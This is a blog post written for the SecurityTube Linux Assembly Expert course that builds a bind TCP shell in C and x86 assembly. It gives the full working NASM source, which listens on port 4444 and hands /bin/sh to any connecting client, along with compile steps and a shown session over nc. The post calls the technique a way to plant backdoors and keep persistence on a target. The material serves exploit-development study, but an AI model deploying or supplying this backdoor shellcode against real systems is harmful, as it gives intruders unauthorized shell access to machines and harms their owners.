A bind shell is used to create a listening port on a target machine, that can be later accessed via the network and interact with a system shell. This is a common technique for creating backdoors and maintaining persistence on a target machine. Assignment number 1 for the SecurityTube Linux Assembly Expert exam is to put together a bind shell shellcode. Let's take a further look into this challenge.



What a bind shell looks like in C
---------------------------------

Before jumping straight into coding in assembly, let's take a look at what a bind shell would look like in a slightly higher level programming language:

```c
#include <stdio.h>  
#include <sys/types.h>   
#include <sys/socket.h>  
#include <netinet/in.h>  
  
int host_sockid;    // sockfd for host  
int client_sockid;  // sockfd for client  
      
struct sockaddr_in hostaddr;            // sockaddr struct  
  
int main()  
{  
    // Create socket  
    host_sockid = socket(PF_INET, SOCK_STREAM, 0);  
  
    // Initialize sockaddr struct to bind socket using it  
    hostaddr.sin_family = AF_INET;  
    hostaddr.sin_port = htons(1337);  
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);  
  
    // Bind socket to IP/Port in sockaddr struct  
    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));  
      
    // Listen for incoming connections  
    listen(host_sockid, 2);  
  
    // Accept incoming connection, don't store data, just use the sockfd created  
    client_sockid = accept(host_sockid, NULL, NULL);  
  
    // Duplicate file descriptors for STDIN, STDOUT and STDERR  
    dup2(client_sockid, 0);  
    dup2(client_sockid, 1);  
    dup2(client_sockid, 2);  
  
    // Execute /bin/sh  
    execve("/bin/sh", NULL, NULL);  
    close(host_sockid);  
      
    return 0;  
}
```

Here we can see a few things happening here. First, let's note the different system calls (syscalls) that are being executed within this code. 

Syscalls:

- socket
- bind
- listen
- accept
- dup2
- execve

There are serveral different ways that we can learn more about these syscalls. Online resources, whitepapers, but the most accessible is the header file located in `/usr/include/i386-linux-gnu/asm/unistd_43.h`.

This file lists out all the syscall values for anything you could need, including the ones listed above. It will be clear as we're writing the bind shell program when we utilize these syscall values, so let's not get too much into that now. 


Next, we will go through the lines of the assignment code that I created to see what's happening.

The first set of instructions are really basic, just clearing out the registers we will be using by using `xor` against themselves. 


```nasm
 	xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        xor edx, edx
```

After this, I will be setting arguments based on the format of the C code we built. So first on the list we are going to set up the socket syscall, which can be seen below with comments


```nasm
        mov bl, 2       ; PF_INET value from /usr/include/i386-linux-gnu/bits/socket.h
        mov cl, 1       ; setting up SOCK_STREAM, as seen in C code and pulled from /usr/include/i386-linux-gnu/bits/socket_type.h
        mov dl, 6       ; setting protocol again as in C code, pulled from /usr/include/linux/netinet/in.h

        mov ax, 359     ; syscall socket()

        int 0x80        ; create the socket ( socket() in C code )
```

Going from top to bottom, I will explain what's happening in detail. First we move the value "2" into bl (First 8 bits of EBX). This value is defined inside the file `/usr/include/i386-linux-gnu/bits/socket.h` which is the header file for the socket syscall. It defines the value of `PF_INET` as 2, which is one of the arguments in the socket syscall. 

Next, the value "1" is put into cl (first 8 bits of ECX) which is the value of `SOCK_STREAM`, the second argument within the socket syscall, defined in the same file as `PF_INET`. 

Finally, the value "6" is moved into dl (First 8 bits of EDX). This value is the definition of the TCP protocol as seen in `/usr/include/linux/netinet/in.h`.

The next line, `mov ax, 359` puts the value "359" into ax (16 bits of EAX). This is the syscall value for socket as seen in `/usr/include/i386-linux-gnu/asm/unistd_32.h`. See the output below to see how I found this value.

```sh
anubis@ubuntu:~/SLAE$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket
#define __NR_socket 359
anubis@ubuntu:~/SLAE$
```

And then `int 0x80` just executes the socket syscall and creates the socket in our program.

Great, so now we have our socket created, next let's work on setting up the bind part of this program, that will actually allow use to "bind" a port on our machine. I'll show the code below and then walk through just as before.


```nasm
	xor edx, edx    ; clear out edx
        mov ebx, eax    ; put the value of the socket creation into ebx
        push edx        ; We want the bind shell to listen on all interfaces, so pushing all zeroes will accomplish this
        push word 0x5c11 ; this is the port (4444) in little endian
        push word 0x02  ; making the the in_family AF_INET again, and doing word for stack management
        mov ecx, esp    ; point the top of the stack that contains the sockaddr structure
        mov dl, 16      ; #define __SOCK_SIZE__   16              /* sizeof(struct sockaddr)      */ --> in /usr/include/linux/in.h
        mov ax, 361     ; bind syscall 

        int 0x80        ; execute bind
```

So the first thing we do is clear out the edx register from what we did before, using `xor`. Next instruction set, we will move the contents of `eax` into `ebx`. This is essentially putting the result of the socket function into `ebx` which is required for the bind syscall. 

Following this, we need to set the IP address as seen in the example C code. This IP address will be the one listening for the bind shell. The best way to maintain access and persistence for an attack is to make this IP address the `0.0.0.0` IP address, which will open the bind port for all interfaces. So the next instruction we will do is `push edx` which just pushes all zeroes on the stack, effectively giving us the IP parameter of `0.0.0.0`. 

We then load the stack with the port number we want to open on the interfaces, which is the next argument to pass. Here we push the word `0x5c11` which is the value `4444` in little endian format, and the also putting `0x02` onto the stack which is loading the value for `AF_INET` for this syscall as seen before. 

Next, we move the address pointing to the the top of the stack (`esp`) into `ecx` since the stack is loaded with the values that compose the `sockaddr` structure, which is what we are trying to emulate from the C code.

Then from the file "/usr/include/linux/in.h" we obtain the value for the `sizeof` function that is also called within bind. This value is defined as 16, so we put that into `dl`, our last argument holder. 

Finally we load `ax` with the syscall value of `bind`, which is 361 as seen in the same file we got the `socket` value from, and we again call the `int 0x80` interrupt to actually execute the bind syscall.


The next few lines are effectively a rinse and repeat from above, executing the `accept` syscall to await connections, and the `dup2` syscall to allow standard in, out, and error. With `dup2` we create a loop, so that it loads all three of the file descriptors so that the bind shell is fully interactive.


The next notable set of instructions is acutally executing the `execve` syscall, which will point to `/bin/sh`, so that when a connection is made to our bind port, it will execute a shell so that an attacker could interact with the target machine.

```nasm
 	push  0x68732f2f ; push the end of "/bin//sh"
        push  0x6e69622f ; push the beginning of "/bin//sh", must do it backwards because of how higher memory goes on top of stack first
```
These instructions are loading the value "/bin//sh" on to the stack. It needs to happen in reverse order (starting with //sh) since x86 works from highest memory to lowest memory values. It's also important to note that we add the extra "/" in the command so that the values are divisible by 8, making memory management easier. We then call the `execve` syscall and then the `exit` syscall to actually start our program and finally create the full bind TCP shell on our target.

Our final program code is seen below:

```nasm
global _start




section .text
	_start:

	; set needed registers to zero

	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx


	; setting arguments

	mov bl, 2 	; PF_INET value from /usr/include/i386-linux-gnu/bits/socket.h
	mov cl, 1	; setting up SOCK_STREAM, as seen in C code and pulled from /usr/include/i386-linux-gnu/bits/socket_type.h
	mov dl, 6	; setting protocol again as in C code, pulled from /usr/include/linux/netinet/in.h
	
	mov ax, 359	; syscall socket()
	
	int 0x80	; create the socket ( socket() in C code ) 


	xor edx, edx	; clear out edx
	mov ebx, eax	; put the value of the socket creation into ebx
	push edx	; We want the bind shell to listen on all interfaces, so pushing all zeroes will accomplish this
	push word 0x5c11 ; this is the port (4444) in little endian
	push word 0x02	; making the the in_family AF_INET again, and doing word for stack management
	mov ecx, esp	; point the top of the stack that contains the sockaddr structure
	mov dl, 16	; #define __SOCK_SIZE__   16              /* sizeof(struct sockaddr)      */ --> in /usr/include/linux/in.h
	mov ax, 361	; bind syscall 
	
	int 0x80	; execute bind


	xor ecx, ecx	; remove esp pointer from ecx
	mov ax, 363	; listen syscall

	int 0x80	; listen for connections

	xor esi, esi	; clear out esi to use as a pointer
	xor edx, edx	; clear out edx
	mov ax, 364	; syscall accept4 (since accept doesn't return any value, and with no flag set accept4 acts identical to accept)
	
	int 0x80	; executing awaiting connections


	mov ebx, eax	; preservation from accept syscall
	mov cl, 3	; set all 3 file descriptors (standard in, out, and error)

	call_dup:
	
	xor eax, eax
	mov al, 63	; syscall dup2
	dec ecx
	
	int 0x80	; dup2 stdin
	
	inc ecx
	loop call_dup


	xor ecx, ecx
	push ecx	; zero out top of stack
	push  0x68732f2f ; push the end of "/bin//sh"
	push  0x6e69622f ; push the beginning of "/bin//sh", must do it backwards because of how higher memory goes on top of stack first

	mov ebx, esp	; mov pointer to /bin//sh into ebx
	mov al, 11	; execve syscall

	int 0x80	; execute /bin//sh "shell"


	xor eax, eax
	mov al, 1	; syscall exit
	
	int 0x80	; exit program
```

Now let's compile our program using the `compile.sh` script from the SLAE exercises.

```sh
anubis@ubuntu:~/SLAE/Assignment_1$ ./compile.sh bind_tcp
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
anubis@ubuntu:~/SLAE/Assignment_1$ ls -al
total 28
drwxrwxr-x  2 anubis anubis 4096 Feb 20 20:53 .
drwxrwxr-x 10 anubis anubis 4096 Feb 18 01:53 ..
-rw-rw-r--  1 anubis anubis 1163 Feb 17 23:57 bind_shell.c
-rwxrwxr-x  1 anubis anubis  640 Feb 20 20:53 bind_tcp
-rw-rw-r--  1 anubis anubis 2162 Feb 18 01:41 bind_tcp.nasm
-rw-rw-r--  1 anubis anubis  544 Feb 20 20:53 bind_tcp.o
-rwxrwxr-x  1 anubis anubis  152 Feb 18 01:40 compile.sh
anubis@ubuntu:~/SLAE/Assignment_1$ 
```

Now we execute our compiled program.

```sh
anubis@ubuntu:~/SLAE/Assignment_1$ ls -al
total 28
drwxrwxr-x  2 anubis anubis 4096 Feb 20 20:53 .
drwxrwxr-x 10 anubis anubis 4096 Feb 18 01:53 ..
-rw-rw-r--  1 anubis anubis 1163 Feb 17 23:57 bind_shell.c
-rwxrwxr-x  1 anubis anubis  640 Feb 20 20:53 bind_tcp
-rw-rw-r--  1 anubis anubis 2162 Feb 18 01:41 bind_tcp.nasm
-rw-rw-r--  1 anubis anubis  544 Feb 20 20:53 bind_tcp.o
-rwxrwxr-x  1 anubis anubis  152 Feb 18 01:40 compile.sh
anubis@ubuntu:~/SLAE/Assignment_1$ ./bind_tcp 
```


There is no output but we can confirm with netstat that we are now listening on 4444 and then connect to this port using `nc`


```sh
anubis@ubuntu:~$ netstat -antp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      3160/bind_tcp   
tcp        0      0 127.0.1.1:53            0.0.0.0:*               LISTEN      -               
```


```sh
anubis@ubuntu:~$ nc 127.0.0.1 4444
id
uid=1000(anubis) gid=1000(anubis) groups=1000(anubis),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
pwd
/home/anubis/SLAE/Assignment_1
hostname
ubuntu
```

When we connet to the bind port, we don't get any output, but when we run commands after connecting, we see that we have a working shell on the host! Perfect.

This has been my journey on creating a Bind TCP shellcode using asm, next I will be creating a Reverse TCP shellcode. See you then!

<hr />

This blog post was created as per the requirements of the Security Tube Linux Assembly Expert certification.

Student ID: SLAE-1406

Please see [https://github.com/AnubisSec/SLAE] for all the source files mentioned on this site.
